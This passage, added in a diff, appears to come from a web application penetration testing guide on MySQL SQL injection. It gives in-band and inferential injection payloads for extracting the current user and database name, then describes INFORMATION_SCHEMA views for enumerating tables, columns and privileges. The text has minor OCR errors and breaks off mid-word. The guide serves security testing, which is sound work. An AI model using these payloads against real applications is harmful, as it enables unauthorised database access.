@@ -1,0 +1,45 @@
+SELECT USER()
+Inferential injection:
+1 AND USER() like ‘root%’
+Result Expected:
+A string like this:
+user@hostname
+Web Application Penetration Testing
+Database name in use
+There is the native function DATABASE()
+In band injection:
+1 AND 1=0 UNION SELECT DATABASE()
+Inferential injection:
+1 AND DATABASE\() like ‘db%’
+Result Expected:
+A string like this:
+dbname
+INFORMATION_SCHEMA
+From MySQL 5.0 a view named [INFORMATION_SCHEMA] was
+created. It allows us to get all informations about databases, ta-
+bles, and columns, as well as procedures and functions.
+Here is
+asummary of some interesting Views.
+Tables_in_INFORMATION_SCHEMA § DESCRIPTION
+. [skipped].
+[skipped].
+SCHEMATA
+All databases the user has (at least) SELECT _priv
+SCHEMA_ PRIVILEGES
+The privileges the user has for each DB
+TABLES
+Alltables the user has (at least) SELECT _priv
+TABLE_PRIVILEGES
+The privileges the user has for each table
+COLUMNS
+All columns the user has (at least) SELECT _priv
+COLUMN_PRIVILEGES
+The privileges the user has for each column
+VIEWS
+All columns the user has (at least) SELECT _priv
+ROUTINES
+Procedures and functions (needs EXECUTE _priv)
+TRIGGERS
+Triggers (needs INSERT_priv)
+USER_PRIVILEGES
+Privileges connec
